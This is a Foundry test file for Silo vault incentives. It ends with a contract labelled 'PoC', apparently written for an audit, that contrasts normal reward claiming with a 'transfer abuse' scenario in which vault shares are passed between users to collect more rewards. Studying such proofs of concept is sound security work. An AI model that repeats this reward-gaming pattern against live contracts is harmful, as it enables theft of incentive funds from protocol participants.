// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.28;

import {SiloIncentivesController} from "silo-core/contracts/incentives/SiloIncentivesController.sol";
import {MintableToken} from "silo-core/test/foundry/_common/MintableToken.sol";
import {DistributionTypes} from "silo-core/contracts/incentives/lib/DistributionTypes.sol";

import {INotificationReceiver} from "../../../contracts/interfaces/INotificationReceiver.sol";
import {IVaultIncentivesModule} from "../../../contracts/interfaces/IVaultIncentivesModule.sol";
import {IVaultIncentivesModule} from "silo-vaults/contracts/interfaces/IVaultIncentivesModule.sol";

import {IntegrationTest} from "../helpers/IntegrationTest.sol";
import {CAP} from "../helpers/BaseTest.sol";

/*
 FOUNDRY_PROFILE=vaults-tests forge test --ffi --mc VaultsSiloIncentivesTest -vvv
*/
contract VaultsSiloIncentivesTest is IntegrationTest {
    MintableToken reward1 = new MintableToken(18);

    SiloIncentivesController vaultIncentivesController;
    IVaultIncentivesModule vaultIncentivesModule;

    function setUp() public override {
        super.setUp();

        vaultIncentivesModule = vault.INCENTIVES_MODULE();
        assertTrue(address(vaultIncentivesModule) != address(0), "empty vaultIncentivesModule");

        _setCap(allMarkets[0], CAP);
        _setCap(allMarkets[1], CAP);
        _setCap(allMarkets[2], CAP);

        reward1.setOnDemand(true);

        vaultIncentivesController = new SiloIncentivesController(address(this), address(vault));
    }

    /*
     FOUNDRY_PROFILE=vaults-tests forge test --ffi --mt test_vaults_incentives_deposit_noRewardsSetup -vv
    */
    function test_vaults_incentives_deposit_noRewardsSetup() public {
        assertTrue(address(vault.INCENTIVES_MODULE()) != address(0), "INCENTIVES_MODULE");

        vm.expectCall(
            address(vault.INCENTIVES_MODULE()),
            abi.encodeWithSelector(IVaultIncentivesModule.getAllIncentivesClaimingLogics.selector)
        );

        vm.expectCall(
            address(vault.INCENTIVES_MODULE()),
            abi.encodeWithSelector(IVaultIncentivesModule.getNotificationReceivers.selector)
        );

        // does not revert without incentives setup
        vault.deposit(1, address(this));

        // does not revert without incentives setup
        vault.claimRewards();
    }

    /*
     FOUNDRY_PROFILE=vaults-tests forge test --ffi --mt test_vaults_incentives_standardRewards -vv
    */
    function test_vaults_incentives_standardRewards() public {
        address user = makeAddr("user");
        // add
        address user2 = makeAddr("user2");

        uint256 rewardsPerSec = 3;
        uint256 depositAmount = 1;

        // standard program for vault users
        vaultIncentivesController.createIncentivesProgram(
            DistributionTypes.IncentivesProgramCreationInput({
                name: "x",
                rewardToken: address(reward1),
                emissionPerSecond: uint104(rewardsPerSec),
                distributionEnd: uint40(block.timestamp + 10)
            })
        );

        vm.prank(OWNER);
        vaultIncentivesModule.addNotificationReceiver(INotificationReceiver(address(vaultIncentivesController)));

        // this call is expected on depositing
        vm.expectCall(
            address(vaultIncentivesController),
            abi.encodeWithSelector(
                INotificationReceiver.afterTokenTransfer.selector,
                address(0),
                0,
                user,
                depositAmount * OFFSET_POW,
                depositAmount * OFFSET_POW,
                depositAmount * OFFSET_POW
            )
        );

        // does not revert without incentives setup
        vm.prank(user); // 用户向 SiloVault deposit assets
        vault.deposit(depositAmount, user);

        vm.warp(block.timestamp + 1);

        assertEq(vaultIncentivesController.getRewardsBalance(user, "x"), rewardsPerSec, "expected reward after 1s");

        vm.prank(user);
        vaultIncentivesController.claimRewards(user);
        assertEq(reward1.balanceOf(user), rewardsPerSec, "user can claim standard reward");


        vm.prank(user2);
        vault.deposit(depositAmount, user2);
        vm.warp(block.timestamp + 1);
        vm.prank(user2);
        vaultIncentivesController.claimRewards(user2);
        assertEq(reward1.balanceOf(user2), 1, "user can claim standard reward");

        assertEq(reward1.balanceOf(user) + reward1.balanceOf(user2), 4);


        // vm.prank(user);
        // vault.transfer(user2, 1000000);// 转移shares
        // assertEq(vault.balanceOf(user2), 1000000);

        // vm.warp(block.timestamp + 1);
        // // 每个用户都会单独记录index
        // vm.prank(user2);
        // vaultIncentivesController.claimRewards(user2);
        // assertEq(reward1.balanceOf(user2), rewardsPerSec, "user can claim standard reward");
    }
}

contract PoC is IntegrationTest {

    MintableToken reward1 = new MintableToken(18);

    SiloIncentivesController vaultIncentivesController;
    IVaultIncentivesModule vaultIncentivesModule;

    uint256 rewardsPerSec = 3;
    uint256 depositAmount = 1;

    address user1;
    address user2;

    uint256 user1_reward;
    uint256 user2_reward;

    function setUp() public override {
        super.setUp();

        vaultIncentivesModule = vault.INCENTIVES_MODULE();
        assertTrue(address(vaultIncentivesModule) != address(0), "empty vaultIncentivesModule");

        _setCap(allMarkets[0], CAP);
        _setCap(allMarkets[1], CAP);
        _setCap(allMarkets[2], CAP);

        reward1.setOnDemand(true);

        vaultIncentivesController = new SiloIncentivesController(address(this), address(vault));

        // standard program for vault users
        vaultIncentivesController.createIncentivesProgram(
            DistributionTypes.IncentivesProgramCreationInput({
                name: "x",
                rewardToken: address(reward1),
                emissionPerSecond: uint104(rewardsPerSec),
                distributionEnd: uint40(block.timestamp + 10)
            })
        );
        vm.prank(OWNER);
        vaultIncentivesModule.addNotificationReceiver(INotificationReceiver(address(vaultIncentivesController)));

        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
    }

    // Scenario 1: Normal deposit flow
    function test_vaults_incentives_deposit() public {
        // user1 deposit 1
        vm.prank(user1);
        vault.deposit(1, user1);

        // wait 1s
        vm.warp(block.timestamp + 1);

        // user1 claim
        vm.prank(user1);
        vaultIncentivesController.claimRewards(user1);
        user1_reward = reward1.balanceOf(user1);
        assertEq(user1_reward, 3);

        // user2 deposit 1
        vm.prank(user2);
        vault.deposit(1, user2);

        // wait 1s
        vm.warp(block.timestamp + 1);

        // user2 claim
        vm.prank(user2);
        vaultIncentivesController.claimRewards(user2);
        user2_reward = reward1.balanceOf(user2);
        assertEq(user2_reward, 1);

        // total = user1_reward + user2_reward = 4
        assertEq(user1_reward + user2_reward, 4);
    }

    // Scenario 2: Transfer abuse
    function test_vaults_incentives_transfer() public {
        // user1 deposit 1
        vm.prank(user1);
        vault.deposit(1, user1);

        // wait 1s
        vm.warp(block.timestamp + 1);

        // user1 claim
        vm.prank(user1);
        vaultIncentivesController.claimRewards(user1);
        user1_reward = reward1.balanceOf(user1);
        assertEq(user1_reward, 3);

        uint256 user1_shares = vault.balanceOf(user1);

        // user1 transfer shares to user2
        vm.prank(user1);
        vault.transfer(user2, user1_shares);

        // wait 1s
        vm.warp(block.timestamp + 1);

        // user2 claim
        vm.prank(user2);
        vaultIncentivesController.claimRewards(user2);
        user2_reward = reward1.balanceOf(user2);
        assertEq(user2_reward, 3);

        // total  = user1_reward + user2_reward = 6
        assertEq(user1_reward + user2_reward , 6);
    }
}